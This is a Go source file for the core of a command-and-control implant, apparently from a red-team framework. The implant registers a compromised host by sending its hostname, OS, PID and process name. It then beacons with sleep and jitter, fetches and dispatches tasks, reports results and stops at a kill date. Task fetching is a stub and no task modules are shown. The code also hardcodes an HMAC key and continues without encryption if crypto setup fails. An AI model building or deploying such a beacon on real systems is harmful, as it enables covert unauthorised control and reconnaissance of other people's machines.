package c2implant

import (
	"fmt"
	"os"
	"os/signal"
	"runtime"
	"sync"
	"syscall"
	"time"

	"github.com/angel-platform/angel/pkg/eventbus"
	"github.com/angel-platform/angel/pkg/logger"
	"github.com/angel-platform/angel/pkg/types"
)

type Implant struct {
	mu          sync.RWMutex
	config      *ImplantConfig
	crypto      *ImplantCrypto
	eventBus    *eventbus.EventBus
	dispatcher  *TaskDispatcher
	log         *logger.Logger
	state       ImplantState
	running     bool
	stopCh      chan struct{}
	agentID     string
	lastCheckIn time.Time
}

type ImplantState string

const (
	StateIdle       ImplantState = "idle"
	StateRunning    ImplantState = "running"
	StateError      ImplantState = "error"
	StateShutdown   ImplantState = "shutdown"
)

func NewImplant(config *ImplantConfig) *Implant {
	if config == nil {
		config = DefaultConfig()
	}

	if err := config.Validate(); err != nil {
		config = DefaultConfig()
	}

	log := logger.New("c2implant", logger.LevelInfo)

	crypto, err := NewImplantCrypto(config.CryptoKey)
	if err != nil {
		log.Error("failed to initialize crypto: %v", err)
		crypto = nil
	}

	eventBus := eventbus.New("implant-hmac-key")

	return &Implant{
		config:     config,
		crypto:     crypto,
		eventBus:   eventBus,
		dispatcher: NewTaskDispatcher(),
		log:        log,
		state:      StateIdle,
		stopCh:     make(chan struct{}),
		agentID:    types.GenerateID(),
	}
}

func (i *Implant) Run() error {
	i.mu.Lock()
	if i.running {
		i.mu.Unlock()
		return fmt.Errorf("implant already running")
	}
	i.running = true
	i.state = StateRunning
	i.mu.Unlock()

	i.log.Info("implant starting with ID: %s", i.agentID)

	if i.config.IsExpired() {
		i.log.Warn("implant has expired (kill date: %v)", i.config.KillDate)
		return fmt.Errorf("implant expired")
	}

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigCh
		i.Shutdown()
	}()

	if err := i.Register(); err != nil {
		i.log.Error("registration failed: %v", err)
		i.mu.Lock()
		i.state = StateError
		i.mu.Unlock()
		return fmt.Errorf("register: %w", err)
	}

	i.log.Info("registered successfully")

	for {
		select {
		case <-i.stopCh:
			i.mu.Lock()
			i.running = false
			i.state = StateShutdown
			i.mu.Unlock()
			i.log.Info("implant shutting down")
			return nil
		default:
		}

		i.mu.RLock()
		expired := i.config.IsExpired()
		sleepTime := i.config.SleepTime
		jitter := i.config.Jitter
		i.mu.RUnlock()

		if expired {
			i.log.Warn("implant expired during run")
			return fmt.Errorf("implant expired")
		}

		if err := i.CheckIn(); err != nil {
			i.log.Error("check-in failed: %v", err)
			retrySleep := i.calculateRetrySleep()
			sc := NewSleepController(retrySleep, jitter)
			sc.Sleep(retrySleep, jitter)
			continue
		}

		task, err := i.FetchTask()
		if err != nil {
			i.log.Error("fetch task failed: %v", err)
		} else if task != nil {
			i.log.Info("received task %s (type: %s)", task.ID, task.Type)
			i.processTask(task)
		}

		sc := NewSleepController(sleepTime, jitter)
		timer := time.NewTimer(sc.CalculateSleep(sleepTime, jitter))
		select {
		case <-timer.C:
		case <-i.stopCh:
			timer.Stop()
		}
	}
}

func (i *Implant) Register() error {
	i.mu.RLock()
	cfg := i.config
	agentID := i.agentID
	i.mu.RUnlock()

	runtimeOS := runtime.GOOS
	hostname, _ := os.Hostname()

	data := map[string]interface{}{
		"agent_id":  agentID,
		"hostname":  hostname,
		"os":        runtimeOS,
		"arch":      runtime.GOARCH,
		"pid":       os.Getpid(),
		"process":   os.Args[0],
		"team_id":   cfg.TeamID,
		"operator":  cfg.OperatorID,
		"first_seen": time.Now().UTC().Format(time.RFC3339),
	}

	_, err := i.eventBus.Publish("c2.register", agentID, "register", data)
	if err != nil {
		return fmt.Errorf("publish register event: %w", err)
	}

	i.mu.Lock()
	i.lastCheckIn = time.Now()
	i.mu.Unlock()

	return nil
}

func (i *Implant) CheckIn() error {
	i.mu.RLock()
	agentID := i.agentID
	i.mu.RUnlock()

	data := map[string]interface{}{
		"agent_id":  agentID,
		"timestamp": time.Now().UTC().Format(time.RFC3339),
		"state":     string(i.getState()),
	}

	_, err := i.eventBus.Publish("c2.checkin", agentID, "checkin", data)
	if err != nil {
		return fmt.Errorf("publish checkin event: %w", err)
	}

	i.mu.Lock()
	i.lastCheckIn = time.Now()
	i.mu.Unlock()

	return nil
}

func (i *Implant) FetchTask() (*types.Task, error) {
	i.mu.RLock()
	agentID := i.agentID
	i.mu.RUnlock()

	data := map[string]interface{}{
		"agent_id": agentID,
	}

	_, err := i.eventBus.Publish("c2.fetch_task", agentID, "fetch", data)
	if err != nil {
		return nil, fmt.Errorf("publish fetch_task event: %w", err)
	}

	return nil, nil
}

func (i *Implant) ExecuteTask(task *types.Task) (*types.TaskResult, error) {
	if task == nil {
		return nil, fmt.Errorf("nil task")
	}

	i.mu.Lock()
	task.Status = types.TaskStatusRunning
	task.StartedAt = time.Now()
	i.mu.Unlock()

	result, err := i.dispatcher.Dispatch(task)

	i.mu.Lock()
	task.EndedAt = time.Now()
	if err != nil {
		task.Status = types.TaskStatusFailed
		task.Error = err.Error()
	} else if result != nil && !result.Success {
		task.Status = types.TaskStatusFailed
		task.Error = result.Error
	} else {
		task.Status = types.TaskStatusCompleted
	}
	i.mu.Unlock()

	return result, err
}

func (i *Implant) ReportResult(taskID string, result []byte) error {
	i.mu.RLock()
	agentID := i.agentID
	i.mu.RUnlock()

	data := map[string]interface{}{
		"agent_id": agentID,
		"task_id":  taskID,
		"result":   string(result),
		"status":   "completed",
	}

	_, err := i.eventBus.Publish("c2.result", agentID, "result", data)
	if err != nil {
		return fmt.Errorf("publish result event: %w", err)
	}

	return nil
}

func (i *Implant) Shutdown() {
	select {
	case <-i.stopCh:
		return
	default:
	}

	close(i.stopCh)
}

func (i *Implant) processTask(task *types.Task) {
	result, err := i.ExecuteTask(task)
	if err != nil {
		i.log.Error("task execution failed: %v", err)
		return
	}

	if result != nil {
		resultJSON := fmt.Sprintf(`{"module":"%s","success":%v}`, result.Module, result.Success)
		if reportErr := i.ReportResult(task.ID, []byte(resultJSON)); reportErr != nil {
			i.log.Error("failed to report result: %v", reportErr)
		}
	}
}

func (i *Implant) calculateRetrySleep() time.Duration {
	i.mu.RLock()
	cfg := i.config
	i.mu.RUnlock()

	baseSleep := cfg.SleepTime * 2
	if baseSleep > 5*time.Minute {
		baseSleep = 5 * time.Minute
	}
	return baseSleep
}

func (i *Implant) getState() ImplantState {
	i.mu.RLock()
	defer i.mu.RUnlock()
	return i.state
}

func (i *Implant) GetID() string {
	i.mu.RLock()
	defer i.mu.RUnlock()
	return i.agentID
}

func (i *Implant) GetState() ImplantState {
	return i.getState()
}

func (i *Implant) IsRunning() bool {
	i.mu.RLock()
	defer i.mu.RUnlock()
	return i.running
}

func (i *Implant) GetConfig() *ImplantConfig {
	i.mu.RLock()
	defer i.mu.RUnlock()
	return i.config
}

func (i *Implant) RegisterTaskHandler(taskType types.TaskType, handler TaskHandler) {
	i.dispatcher.RegisterHandler(taskType, handler)
}

func (i *Implant) GetEventBus() *eventbus.EventBus {
	return i.eventBus
}

func (i *Implant) GetDispatcher() *TaskDispatcher {
	return i.dispatcher
}

func (i *Implant) StopEventBus() {
	i.eventBus.Stop()
}
